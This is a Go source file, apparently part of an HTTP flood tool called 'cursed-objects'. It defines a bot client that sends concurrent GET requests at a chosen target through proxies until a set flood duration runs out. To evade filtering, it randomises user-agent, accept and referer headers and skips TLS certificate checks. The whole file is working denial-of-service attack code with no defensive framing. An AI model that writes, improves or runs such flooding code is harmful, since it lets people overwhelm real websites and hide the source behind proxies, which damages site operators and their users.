package bot

import (
	"crypto/tls"
	"fmt"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"time"

	"z3ntl3/cursed-objects/globals"

	"github.com/monaco-io/request/request"
)

type (
	BotClient struct {
		Target string
		StopAt time.Time
		Concurrency int
	}
)

func(c *BotClient) Request(proxy string) error{
	if time.Now().Unix() >= c.StopAt.Unix() {
		log.Fatal("Forced STOP due to flood duration exceeded given time")
	}
	ref := globals.Table
	req := request.New().
	AddTLSConfig(&tls.Config{InsecureSkipVerify: true}).
	AddHeader(map[string]string{
		"cache-control": "must-revalidate",
		"user-agent": ref[globals.UAS][rand.Intn(len(ref[globals.UAS]))],
		"accept": ref[globals.ACCEPTS][rand.Intn(len(ref[globals.ACCEPTS]))],
		"referer": ref[globals.REFS][rand.Intn(len(ref[globals.REFS]))],
		"connection": "keep-alive",
	})

	proxyUri, err := url.Parse(proxy); if err != nil {
		return err
	}
	req.Ctx().Client.Transport = &http.Transport{
		Proxy: http.ProxyURL(proxyUri),
	}

	req = req.GET(c.Target)
	for i := 0 ; i < c.Concurrency; i ++ {
		go func(){
			resp := req.Send()
			defer resp.Close()

			if resp.OK() {
				// SUCCESS
				fmt.Printf("\x1b[33m[SUCCESS]\x1b[0m \x1b[1m %s:%s\r\n", proxyUri.Host, proxyUri.Port())
			} else {
				// FAILURE
				fmt.Printf("\x1b[31m[FAIL]\x1b[0m \x1b[1m %s:%s\r\n", proxyUri.Host, proxyUri.Port())
			}

			
		}()
	}

	return nil
}	